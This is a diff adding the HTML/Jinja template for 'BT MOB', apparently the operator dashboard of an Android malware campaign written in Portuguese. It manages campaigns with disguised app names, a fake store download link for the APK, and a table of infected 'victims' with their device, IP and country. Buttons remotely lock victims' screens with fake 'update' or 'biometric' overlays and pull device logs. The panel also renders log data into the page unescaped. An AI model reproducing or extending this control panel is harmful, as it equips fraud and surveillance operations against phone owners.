@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BT MOB - {{ campaign.name }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .navbar {
+            background: #1a1a2e;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #333;
+        }
+        .navbar h1 {
+            color: #00ff88;
+            font-size: 24px;
+        }
+        .navbar a {
+            color: #888;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .navbar a:hover {
+            color: #00ff88;
+        }
+        .container {
+            padding: 30px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        .campaign-header {
+            background: #1a1a2e;
+            border-radius: 10px;
+            border: 1px solid #333;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+        .campaign-header h2 {
+            color: #00ff88;
+            margin-bottom: 15px;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .info-item {
+            background: #0a0a0a;
+            padding: 12px;
+            border-radius: 6px;
+        }
+        .info-item label {
+            display: block;
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 4px;
+        }
+        .info-item span {
+            font-size: 14px;
+        }
+        .download-box {
+            background: #0a0a0a;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .download-box input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #00ff88;
+            font-family: monospace;
+            font-size: 14px;
+            outline: none;
+        }
+        .btn {
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: none;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .btn-copy {
+            background: #00ff88;
+            color: #000;
+        }
+        .section {
+            background: #1a1a2e;
+            border-radius: 10px;
+            border: 1px solid #333;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+        .section h3 {
+            color: #00ff88;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        th {
+            color: #888;
+            font-weight: normal;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+        td {
+            font-size: 14px;
+        }
+        .status-online {
+            color: #00ff88;
+        }
+        .status-offline {
+            color: #ff4444;
+        }
+        .lock-controls {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .btn-lock {
+            background: #ff4444;
+            color: #fff;
+        }
+        .btn-lock:hover {
+            background: #cc3333;
+        }
+        .btn-unlock {
+            background: #00ff88;
+            color: #000;
+        }
+        .btn-logs {
+            background: #444;
+            color: #fff;
+        }
+        .locked-badge {
+            background: #ff4444;
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 11px;
+        }
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #1a1a2e;
+            border-radius: 10px;
+            border: 1px solid #333;
+            padding: 25px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .modal-header h3 {
+            color: #00ff88;
+        }
+        .close-modal {
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .log-entry {
+            background: #0a0a0a;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+        .log-entry .timestamp {
+            color: #888;
+            font-size: 11px;
+        }
+        .log-entry .event {
+            color: #00ff88;
+            font-weight: bold;
+        }
+        .delete-form {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <h1>BT MOB</h1>
+        <a href="{{ url_for('dashboard') }}">← Dashboard</a>
+    </nav>
+
+    <div class="container">
+        <div class="campaign-header">
+            <h2>{{ campaign.name }}</h2>
+            <div class="info-grid">
+                <div class="info-item">
+                    <label>App Name</label>
+                    <span>{{ campaign.app_name }}</span>
+                </div>
+                <div class="info-item">
+                    <label>Package</label>
+                    <span><code>{{ campaign.package_name }}</code></span>
+                </div>
+                <div class="info-item">
+                    <label>Downloads</label>
+                    <span>{{ campaign.download_count }}</span>
+                </div>
+                <div class="info-item">
+                    <label>Vítimas</label>
+                    <span>{{ campaign.victims|length }}</span>
+                </div>
+                <div class="info-item">
+                    <label>Criado</label>
+                    <span>{{ campaign.created_at.strftime('%d/%m/%Y %H:%M') }}</span>
+                </div>
+            </div>
+
+            <div class="download-box">
+                <span style="color: #888;">🔗 Link de Download:</span>
+                <input type="text" id="downloadUrl" value="{{ download_url.replace('/download/', '/store/') }}" readonly>
+                <button class="btn btn-copy" onclick="copyUrl()">Copiar</button>
+            </div>
+
+            <div class="delete-form">
+                <form method="POST" action="{{ url_for('delete_campaign', campaign_id=campaign.id) }}" onsubmit="return confirm('Tem certeza que deseja excluir esta campanha? Todos os dados serão perdidos.');">
+                    <button type="submit" class="btn" style="background: #ff4444; color: #fff;">🗑 Excluir Campanha</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>🎯 Vítimas Conectadas</h3>
+            {% if victims %}
+            <table>
+                <thead>
+                    <tr>
+                        <th>Device ID</th>
+                        <th>Modelo</th>
+                        <th>Android</th>
+                        <th>IP</th>
+                        <th>País</th>
+                        <th>Status</th>
+                        <th>Última vez</th>
+                        <th>Ações</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for victim in victims %}
+                    <tr data-victim-id="{{ victim.id }}">
+                        <td><code style="font-size: 11px;">{{ victim.device_id[:16] }}...</code></td>
+                        <td>{{ victim.device_model or 'N/A' }}</td>
+                        <td>{{ victim.android_version or 'N/A' }}</td>
+                        <td>{{ victim.ip_address or 'N/A' }}</td>
+                        <td>{{ victim.country or 'N/A' }}</td>
+                        <td>
+                            {% if victim.screen_locked %}
+                                <span class="locked-badge">🔒 BLOQUEADO ({{ victim.lock_type }})</span>
+                            {% else %}
+                                <span class="status-online">● Online</span>
+                            {% endif %}
+                        </td>
+                        <td style="color: #888;">{{ victim.last_seen.strftime('%H:%M') }}</td>
+                        <td>
+                            <div class="lock-controls">
+                                <button class="btn btn-lock" onclick="lockScreen({{ victim.id }}, 'update')">📱 Atualização</button>
+                                <button class="btn btn-lock" onclick="lockScreen({{ victim.id }}, 'biometric')">👤 Biometria</button>
+                                <button class="btn btn-unlock" onclick="unlockScreen({{ victim.id }})">🔓 Desbloquear</button>
+                                <button class="btn btn-logs" onclick="showLogs({{ victim.id }})">📋 Logs</button>
+                            </div>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <div class="empty-state">
+                <p>Nenhuma vítima conectada ainda.</p>
+                <p style="margin-top: 10px; color: #888;">Aguardando instalações do APK...</p>
+            </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <div class="modal" id="logsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>📋 Logs do Dispositivo</h3>
+                <button class="close-modal" onclick="closeLogs()">&times;</button>
+            </div>
+            <div id="logsContent">
+                <p style="color: #888;">Carregando...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function copyUrl() {
+            const input = document.getElementById('downloadUrl');
+            input.select();
+            document.execCommand('copy');
+            alert('Link copiado!');
+        }
+
+        async function lockScreen(victimId, type) {
+            try {
+                const res = await fetch(`/api/victim/${victimId}/lock`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: type })
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    alert('Tela bloqueada!');
+                    location.reload();
+                }
+            } catch (e) {
+                alert('Erro: ' + e.message);
+            }
+        }
+
+        async function unlockScreen(victimId) {
+            try {
+                const res = await fetch(`/api/victim/${victimId}/unlock`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    alert('Tela desbloqueada!');
+                    location.reload();
+                }
+            } catch (e) {
+                alert('Erro: ' + e.message);
+            }
+        }
+
+        async function showLogs(victimId) {
+            document.getElementById('logsModal').style.display = 'flex';
+            const content = document.getElementById('logsContent');
+            content.innerHTML = '<p style="color: #888;">Carregando...</p>';
+            try {
+                const res = await fetch(`/api/victim/${victimId}/logs`);
+                const logs = await res.json();
+                if (logs.length === 0) {
+                    content.innerHTML = '<p style="color: #888;">Nenhum log encontrado.</p>';
+                    return;
+                }
+                content.innerHTML = logs.map(log => `
+                    <div class="log-entry">
+                        <div class="timestamp">${new Date(log.timestamp).toLocaleString('pt-BR')}</div>
+                        <div class="event">${log.event_type}</div>
+                        <div style="color: #ccc; margin-top: 4px;">${log.data || ''}</div>
+                    </div>
+                `).join('');
+            } catch (e) {
+                content.innerHTML = '<p style="color: #ff4444;">Erro ao carregar logs.</p>';
+            }
+        }
+
+        function closeLogs() {
+            document.getElementById('logsModal').style.display = 'none';
+        }
+
+        setInterval(() => {
+            if (document.getElementById('logsModal').style.display !== 'flex') {
+                location.reload();
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
